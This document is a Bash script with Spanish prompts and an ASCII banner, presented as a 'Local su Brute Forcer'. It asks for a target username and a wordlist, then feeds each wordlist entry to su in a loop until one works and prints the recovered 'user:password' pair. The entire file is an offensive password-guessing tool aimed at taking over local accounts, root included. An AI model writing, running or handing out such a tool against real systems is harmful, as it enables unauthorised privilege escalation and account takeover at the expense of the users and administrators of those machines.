#!/bin/bash

# Banner ASCII art - kforce
clear
echo -e "\e[1;32m"
cat << "EOF"
 ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
 ██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
 █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
 ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
 ██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
 ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
EOF
echo -e "\e[0m"
echo -e "\e[1;36m        Local su Brute Forcer - by kaiteMuak\e[0m"
echo ""

# Preguntar usuario
read -p "[+] Usuario a atacar: " usuario

if [ -z "$usuario" ]; then
    echo "[-] Debes ingresar un usuario."
    exit 1
fi

# Preguntar wordlist
read -p "[+] Ruta de la wordlist: " wordlist

if [ -z "$wordlist" ]; then
    echo "[-] Debes ingresar una wordlist."
    exit 1
fi

if [ ! -f "$wordlist" ]; then
    echo "[-] Wordlist no encontrada en: $wordlist"
    exit 1
fi

echo ""
echo "[*] Iniciando ataque contra el usuario: $usuario"
echo "[*] Usando wordlist: $wordlist"
echo ""

# Fuerza bruta
while IFS= read -r pass; do
    if echo "$pass" | su "$usuario" -c "echo SUCCESS" 2>/dev/null | grep -q "SUCCESS"; then
        echo "[+] Contraseña encontrada: $usuario:$pass"
        exit 0
    fi
done < "$wordlist"

echo "[-] No se encontró contraseña para $usuario"
